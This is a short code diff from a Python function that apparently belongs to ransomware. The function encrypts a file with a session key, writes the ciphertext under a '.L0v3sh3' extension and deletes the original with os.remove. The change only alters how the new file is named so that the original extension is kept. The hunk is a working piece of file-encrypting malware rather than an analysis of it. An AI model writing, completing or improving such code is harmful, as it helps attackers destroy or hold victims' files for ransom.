@@ -62,7 +62,7 @@ def encrypt(dataFile, publicKey):
     fileName= dataFile.split(extension)[0]
     print(fileName)
     fileExtension = '.L0v3sh3'
-    encryptedFile = fileName + fileExtension
+    encryptedFile = dataFile + fileExtension
     with open(encryptedFile, 'wb') as f:
         [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
     os.remove(dataFile)
